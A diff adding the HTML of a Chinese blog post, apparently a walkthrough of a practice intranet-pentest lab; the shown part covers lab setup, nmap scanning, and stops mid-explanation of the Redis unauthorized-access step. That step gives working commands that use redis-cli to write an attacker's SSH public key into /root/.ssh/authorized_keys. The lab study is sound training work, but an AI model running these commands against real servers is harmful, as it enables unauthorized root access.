@@ -1,0 +1,1819 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>小迪VPC3内网打靶全流程记录 - blog</title>
+
+  
+    <meta name="description" content="小迪VPC3内网打靶全流程记录 难度评分：8 | 难度等级：中级考核内容：从外网打到内网域，拿下所有靶场权限主要技术：Redis攻防、Linux横向、MSSQL提权、Exchange攻防、免杀对抗   目录 环境配置 外网打点：Redis 未授权 → SSH 公钥写入 第一层内网：52 网段信息收集 第二层内网：93 网段 + MSF 路由代理 MSSQL 入口：SRV-WEB-KIT 落地 CS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小迪VPC3内网打靶全流程记录">
+<meta property="og:url" content="https://wr0ld.github.io/posts/b8e3f9c1/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="小迪VPC3内网打靶全流程记录 难度评分：8 | 难度等级：中级考核内容：从外网打到内网域，拿下所有靶场权限主要技术：Redis攻防、Linux横向、MSSQL提权、Exchange攻防、免杀对抗   目录 环境配置 外网打点：Redis 未授权 → SSH 公钥写入 第一层内网：52 网段信息收集 第二层内网：93 网段 + MSF 路由代理 MSSQL 入口：SRV-WEB-KIT 落地 CS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-05-08T08:30:00.000Z">
+<meta property="article:modified_time" content="2026-05-08T12:05:42.577Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Redis">
+<meta property="article:tag" content="MSSQL">
+<meta property="article:tag" content="Exchange">
+<meta property="article:tag" content="CVE-2020-0688">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="免杀,内网渗透,渗透测试,Redis,MSSQL,Exchange,CVE-2020-0688">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=mowvchv0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-08T16:30:00+08:00","dateModified":"2026-05-08T20:05:42+08:00","datePublished":"2026-05-08T16:30:00+08:00","description":"","headline":"小迪VPC3内网打靶全流程记录","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/b8e3f9c1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/b8e3f9c1/","keywords":"免杀, 内网渗透, 渗透测试, Redis, MSSQL, Exchange, CVE-2020-0688","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/o8fOUA2JA8ADdIQPH1LeJEgFZBeATEI07AGdBh~tplv-dy-vqe2-v2_1920_1054_q80.jpg","image":1}</script>
+  
+</head>
+<body><div class="reading-progress-bar"></div>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><div class="menu-divider"></div><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="相册" href="/gallery/" style="color:#FF9FF3"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2s7.071 0 8.535 1.464C22 4.93 22 7.286 22 12s0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12" opacity=".5"/><path fill="currentColor" d="M8.5 9.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2"/><path fill="currentColor" fill-rule="evenodd" d="M12 12c0-.943 0-1.414.293-1.707S13.057 10 14 10h2c.943 0 1.414 0 1.707.293S18 11.057 18 12v2c0 .943 0 1.414-.293 1.707S16.943 16 16 16h-2c-.943 0-1.414 0-1.707-.293S12 14.943 12 14zM2 12c0 4.714 0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12m1 6l3.296-3.296a1.117 1.117 0 0 1 1.58 0l.374.373a1.117 1.117 0 0 0 1.58 0l3.17-3.17a1.117 1.117 0 0 1 1.58 0L18 14" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper slide-up todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner slide-up top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Windows/">Windows</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/Windows/vpc/">vpc</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-05-08T08:30:00.000Z">2026-05-08</time></span><span class="sep"></span><span class="text word-count">字数：14639</span><span class="sep"></span><span class="text img-count">图片：99</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>小迪VPC3内网打靶全流程记录</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h1 id="小迪VPC3内网打靶全流程记录"><a href="#小迪VPC3内网打靶全流程记录" class="headerlink" title="小迪VPC3内网打靶全流程记录"></a>小迪VPC3内网打靶全流程记录</h1><blockquote>
+<p>难度评分：8 | 难度等级：中级<br>考核内容：从外网打到内网域，拿下所有靶场权限<br>主要技术：Redis攻防、Linux横向、MSSQL提权、Exchange攻防、免杀对抗</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
+<li><a href="#%E4%BA%8C%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9redis-%E6%9C%AA%E6%8E%88%E6%9D%83--ssh-%E5%85%AC%E9%92%A5%E5%86%99%E5%85%A5">外网打点：Redis 未授权 → SSH 公钥写入</a></li>
+<li><a href="#%E4%B8%89%E7%AC%AC%E4%B8%80%E5%B1%82%E5%86%85%E7%BD%9152-%E7%BD%91%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">第一层内网：52 网段信息收集</a></li>
+<li><a href="#%E5%9B%9B%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%9193-%E7%BD%91%E6%AE%B5--msf-%E8%B7%AF%E7%94%B1%E4%BB%A3%E7%90%86">第二层内网：93 网段 + MSF 路由代理</a></li>
+<li><a href="#%E4%BA%94mssql-%E5%85%A5%E5%8F%A3srv-web-kit-%E8%90%BD%E5%9C%B0">MSSQL 入口：SRV-WEB-KIT 落地</a></li>
+<li><a href="#%E5%85%ADcs-%E4%B8%8A%E7%BA%BF%E6%8F%90%E6%9D%83%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">CS 上线、提权、域内信息收集</a></li>
+<li><a href="#%E4%B8%83%E6%89%93-exchangecve-2020-0688">打 Exchange：CVE-2020-0688</a></li>
+<li><a href="#%E5%85%AB%E6%A8%AA%E5%90%91%E5%88%B0-df%E5%85%8D%E6%9D%80--amsi-%E7%BB%95%E8%BF%87">横向到 DF：免杀 + AMSI 绕过</a></li>
+<li><a href="#%E4%B9%9D%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<hr>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_l3gr.png"></p>
+<h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="虚拟机网卡设置"><a href="#虚拟机网卡设置" class="headerlink" title="虚拟机网卡设置"></a>虚拟机网卡设置</h3><p><strong>VM网卡配置</strong>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_tt8l.png"></p>
+<p>本机保留一个网卡用于通信，其他 3 个关闭。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_43kx.png"></p>
+<p>靶场一共5台机器，分布在不同网段：</p>
+<table>
+<thead>
+<tr>
+<th>机器</th>
+<th>系统</th>
+<th>角色</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Ubuntu 64位 (Web 1)</td>
+<td>Linux</td>
+<td>外网跳板，Redis服务</td>
+</tr>
+<tr>
+<td>Ubuntu 64位 (Web 2)</td>
+<td>Linux</td>
+<td>内网跳板</td>
+</tr>
+<tr>
+<td>2012 R2 Srv-Web</td>
+<td>Windows 2012</td>
+<td>Web服务器，MSSQL</td>
+</tr>
+<tr>
+<td>Windows 10 x64 DF</td>
+<td>Windows 10</td>
+<td>域内工作站，有Defender</td>
+</tr>
+<tr>
+<td>2012 Exchange2013 Srv-DC</td>
+<td>Windows 2012</td>
+<td>域控 + Exchange</td>
+</tr>
+</tbody></table>
+<p><strong>虚拟机网卡配置</strong>：</p>
+<p>Ubuntu 64 位 (Web 1)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160750456.png"></p>
+<p>Ubuntu 64 位 (Web 2)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160805232.png"></p>
+<p>2012 R2 Rootkit.org Srv-Web</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160818144.png"></p>
+<p>Windows 10 x64-DF 的克隆</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160835584.png"></p>
+<p>2012 x64 Exchange2013Sp1 Rootkit.org Srv-DC</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160847232.png"></p>
+<p><strong>服务启动</strong>：</p>
+<p>Ubuntu 64 位 (Web 1)</p>
+<p>机器密码：<code>web2021</code></p>
+<p>启动环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换 root</span></span><br><span class="line"><span class="built_in">sudo</span> -i</span><br><span class="line"><span class="comment"># 如需输入密码就是 web2021</span></span><br><span class="line"><span class="comment"># 启动 redis 服务</span></span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_rkpf.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508164011512.png"></p>
+<p>Ubuntu 64 位 (Web 2)</p>
+<p>机器密码：<code>ubuntu</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -i</span><br><span class="line"><span class="comment"># 密码 ubuntu</span></span><br><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、外网打点：Redis-未授权-→-SSH-公钥写入"><a href="#二、外网打点：Redis-未授权-→-SSH-公钥写入" class="headerlink" title="二、外网打点：Redis 未授权 → SSH 公钥写入"></a>二、外网打点：Redis 未授权 → SSH 公钥写入</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先确认 Kali 自己的 IP，是 <code>192.168.1.129</code>，然后 nmap 扫一下整个网段找目标。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_3io7.png"></p>
+<p>找到目标了，<code>192.168.1.128</code>，然后对它做详细扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.1.128</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>参数说明</strong></p>
+<ul>
+<li><code>-A</code>：全能扫描模式，一次性包含操作系统探测、版本探测、脚本扫描、路由追踪，扫得最全面。</li>
+<li><code>-p-</code>：扫描全部 0~65535 所有端口，默认 nmap 只扫常用 1000 个端口，加 <code>-p-</code> 是全端口暴力扫。</li>
+<li><code>192.168.1.0/24</code>：扫描整个 192.168.1.x 局域网范围（.1 ~ .254）。</li>
+</ul>
+</blockquote>
+<p><strong>扫描结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>版本信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>22&#x2F;tcp</strong></td>
+<td>SSH</td>
+<td>OpenSSH 7.6p1 (Ubuntu)</td>
+</tr>
+<tr>
+<td><strong>80&#x2F;tcp</strong></td>
+<td>HTTP</td>
+<td>nginx 1.14.0 (Ubuntu)</td>
+</tr>
+<tr>
+<td><strong>81&#x2F;tcp</strong></td>
+<td>HTTP</td>
+<td>nginx 1.14.0 (Ubuntu) - 返回 502 Bad Gateway</td>
+</tr>
+<tr>
+<td><strong>6379&#x2F;tcp</strong></td>
+<td>Redis</td>
+<td>Redis key-value store 2.8.17</td>
+</tr>
+</tbody></table>
+<p>重点关注 6379 端口，Redis 版本 2.8.17 比较老，而且 OS 信息显示是 Linux 内核 4.15~5.19，大概率存在 Redis 未授权访问。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_cknj.png"></p>
+<p>这些意思是可能存在这些漏洞，但是没有验证成功</p>
+<h3 id="Redis-未授权确认"><a href="#Redis-未授权确认" class="headerlink" title="Redis 未授权确认"></a>Redis 未授权确认</h3><p>直接用工具尝试无密码未授权连接：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_toew.png"></p>
+<p>果然连上了。执行 <code>config get dir</code> 看一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_vgre.png"></p>
+<p>返回 <code>/root</code>。普通用户根本没权限访问 <code>/root</code> 目录，能返回这个路径说明 Redis 是跑在 root 权限下的。</p>
+<h3 id="Redis-未授权写-SSH-公钥"><a href="#Redis-未授权写-SSH-公钥" class="headerlink" title="Redis 未授权写 SSH 公钥"></a>Redis 未授权写 SSH 公钥</h3><p>既然 Redis 是 root 权限，那思路就清晰了——把自己的 SSH 公钥通过 Redis 写进 <code>/root/.ssh/authorized_keys</code>，然后直接 SSH 免密登录。</p>
+<p><strong>第一步：Kali 生成 SSH 密钥对</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -f ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>ssh-keygen</code>：生成 SSH 密钥对的工具</li>
+<li><code>-t rsa</code>：指定密钥类型为 RSA（最常用的加密算法）</li>
+<li><code>-f ~/.ssh/id_rsa</code>：指定保存路径，会生成：<ul>
+<li><code>~/.ssh/id_rsa</code> → 私钥（自己留着）</li>
+<li><code>~/.ssh/id_rsa.pub</code> → 公钥（写进目标）</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>遇到提示全部回车就行，不用设密码。</p>
+<p><strong>第二步：把公钥处理成 Redis 能接受的格式</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /tmp/key.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>为什么要加 <code>\n\n</code>？</strong></p>
+<p>Redis 在保存数据到文件时，会在内容前后加一些自己的格式数据（类似文件头和文件尾）。如果公钥紧贴着这些”杂质”数据，SSH 读取 <code>authorized_keys</code> 时会解析失败。</p>
+<p>前后加 <code>\n\n</code>（空行），是为了把公钥和 Redis 的杂质数据隔开，确保 SSH 能干净地读到公钥内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Redis杂质数据]</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAA...你的公钥</span><br><span class="line"></span><br><span class="line">[Redis杂质数据]</span><br></pre></td></tr></table></figure>
+
+<p>中间空行隔开，SSH 就能正确识别了。</p>
+</blockquote>
+<p><strong>第三步：把公钥推进 Redis</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/key.txt | redis-cli -h 192.168.1.128 -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_fems.png"></p>
+<p>返回 <code>OK</code>，公钥已经存进 Redis 数据库里了。注意这一步只是暂存在 Redis 内存里（键名叫 <code>xxx</code>），还没写到文件系统。</p>
+<p><strong>第四步：连接 Redis 设置写入路径并保存</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.128</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_nqie.png"></p>
+<p>全部 OK，写入成功。</p>
+<blockquote>
+<p><strong>整个逻辑梳理一下：</strong></p>
+<ul>
+<li><code>set xxx</code> → 把公钥存进 Redis 内存</li>
